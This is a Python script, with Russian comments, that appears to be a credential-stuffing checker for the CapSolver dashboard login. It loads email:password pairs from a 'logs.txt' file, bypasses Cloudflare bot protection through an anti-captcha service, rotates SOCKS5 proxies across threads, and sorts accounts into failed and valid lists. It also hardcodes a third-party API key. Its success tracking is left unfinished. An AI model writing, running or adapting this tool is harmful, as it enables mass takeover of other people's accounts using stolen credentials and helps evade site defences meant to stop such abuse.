import os
import re
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

from anticaptchaofficial.antigatetask import antigateTask
from bs4 import BeautifulSoup
from colorama import init
from curl_cffi import requests

init(autoreset=True)

LOGIN_URL = 'https://dashboard.capsolver.com/passport/login'


def convert_proxies(file_path):
    updated_proxies = []
    socks5_regex = re.compile(r'^socks5://.+')

    with open(file_path, 'r') as infile:
        for line in infile:
            line = line.strip()
            if not line:
                continue

            if socks5_regex.match(line):
                updated_proxies.append(line)
                continue

            parts = line.split(':')
            if len(parts) == 4:
                host = parts[0]
                port = parts[1]
                username = parts[2]
                password = parts[3]
                new_proxy_format = f"socks5://{username}:{password}@{host}:{port}"
                updated_proxies.append(new_proxy_format)
            else:
                print(f"Incorrect proxy format: {line}")
                updated_proxies.append(line)

    with open(file_path, 'w') as outfile:
        for proxy in updated_proxies:
            outfile.write(proxy + '\n')


def ensure_file_exists(file_path):
    if not os.path.isfile(file_path):
        open(file_path, 'a').close()


def load_proxies(file_path):
    proxies = []
    with open(file_path, 'r') as file:
        for line in file:
            proxies.append(line.strip())
    return proxies


def load_unique_entries(file_path):
    with open(file_path, 'r') as file:
        entries = set(line.strip().split(":")[0] for line in file if line.strip())
    return entries


def load_valid_entries(file_path="valid.txt"):
    with open(file_path, 'r') as file:
        entries = set(line.strip().split(":")[0] for line in file if line.strip())
    return entries


def remove_processed_entry(email, password, file_path="logs.txt"):
    with open(file_path, 'r') as file:
        lines = file.readlines()
    with open(file_path, 'w') as file:
        for line in lines:
            if line.strip() != f"{email}:{password}":
                file.write(line)


def login(email, password, proxies, proxy_index, lock, processed_entries, failed_entries, valid_entries, valid_count):
    solver = antigateTask()
    solver.set_verbose(1)
    solver.set_key("c11b382bb4e43c8ec4b87717f731f844")
    solver.set_website_url(LOGIN_URL)
    solver.set_template_name("Bypass CloudFlare")
    solver.set_variables({
        "css_selector": ".cf-browser-verification"
    })

    with lock:
        if email in processed_entries or email in valid_entries:
            print(f'{email} is already processed or valid')
            remove_processed_entry(email, password)
            return
        if email in failed_entries:
            print(f'{email} is already processed')
            remove_processed_entry(email, password)
            return

    # + 3 - количество потоков. если бы было 5 потоков, нужно поставить (proxy_index + 5)
    proxy_index = (proxy_index + 3) % len(proxies)
    session = requests.Session()
    max_attempts = 15
    attempt = 0

    while attempt < max_attempts:
        proxy = {
            "http": proxies[proxy_index % len(proxies)],
            "https": proxies[proxy_index % len(proxies)]
        }

        try:
            while True:
                result = solver.solve_and_return_solution()
                if result != 0:
                    cookies = result["cookies"]
                    localStorage = result["localStorage"]
                    sessionStorage = result["sessionStorage"]
                    fingerprint = result["fingerprint"]
                    url = result["url"]
                    requestHeaders = result.get("requestHeaders", [])
                    responseHeaders = result.get("responseHeaders", [])

                    cookies_dict = {cookie['name']: cookie['value'] for cookie in cookies}

                    headers = {
                        "User-Agent": fingerprint["userAgent"],
                        "Accept-Language": fingerprint.get("language", "en-US,en;q=0.9"),
                        "Referer": url,
                        "Accept": fingerprint.get("accept", "*/*"),
                        "Accept-Encoding": fingerprint.get("acceptEncoding", "gzip, deflate, br"),
                    }

                    for header in requestHeaders:
                        headers[header['name']] = header['value']

                    for header in responseHeaders:
                        headers[header['name']] = header['value']

                    for key, value in localStorage.items():
                        headers[f"X-LocalStorage-{key}"] = value

                    for key, value in sessionStorage.items():
                        headers[f"X-SessionStorage-{key}"] = value

                    response = session.get(url, headers=headers, cookies=cookies_dict)
                    print("Статус-код:", response.status_code)

                    soup = BeautifulSoup(response.text, 'html.parser')
                    email_input = soup.find('input', {'name': 'email'})
                    password_input = soup.find('input', {'name': 'password'})

                    if email_input and password_input:
                        login_data = {
                            email_input['name']: email,
                            password_input['name']: password
                        }

                        login_response = session.post(url, headers=headers, cookies=cookies_dict, data=login_data)
                        print("Статус-код после логина:", login_response.status_code)
                        with open('response.html', 'w') as outfile:
                            outfile.write(login_response.text)
                            print("Ответ после логина записан")
                    else:
                        print("Не удалось найти поля ввода для email или password.")

                    break
                else:
                    print("Anticaptcha error:", solver.error_code)
                    time.sleep(5)
        except:
            attempt += 1
            # + 3 - количество потоков. если бы было 5 потоков, нужно поставить (proxy_index + 5)
            proxy_index = (proxy_index + 3) % len(proxies)
            time.sleep(1)

    with lock:
        if email not in failed_entries:
            with open("base_failed.txt", "a") as failed_file:
                failed_file.write(f"{email}:{password}\n")
            failed_entries.add(email)
            remove_processed_entry(email, password)


def main():
    convert_proxies("proxies.txt")

    ensure_file_exists("logs.txt")
    ensure_file_exists("base.txt")
    ensure_file_exists("base_failed.txt")
    ensure_file_exists("valid.txt")

    proxies = load_proxies("proxies.txt")
    credentials = []
    with open("logs.txt", 'r', encoding='utf-8', errors='replace') as log_file:
        for line in log_file:
            line = line.strip()
            if line:
                credentials.append(line.split(":", 1))

    processed_entries = load_unique_entries("base.txt")
    failed_entries = load_unique_entries("base_failed.txt")
    valid_entries = load_valid_entries("valid.txt")

    lock = threading.Lock()
    valid_count = [0]

    # max_workers=3 количество потоков. если бы было 5 потоков, нужно сверху изменить на (proxy_index + 5) в двух случаях
    # там стоят комментарии, подобные этим
    with ThreadPoolExecutor(max_workers=3) as executor:
        future_to_email = {
            executor.submit(login, email, password, proxies, i, lock, processed_entries, failed_entries,
                            valid_entries, valid_count): email
            for i, (email, password) in enumerate(credentials)
        }
        for future in as_completed(future_to_email):
            future.result()

    print(f'\nКоличество валидных аккаунтов: {valid_count}')
    input("Нажмите Enter, чтобы закрыть...")


if __name__ == "__main__":
    main()
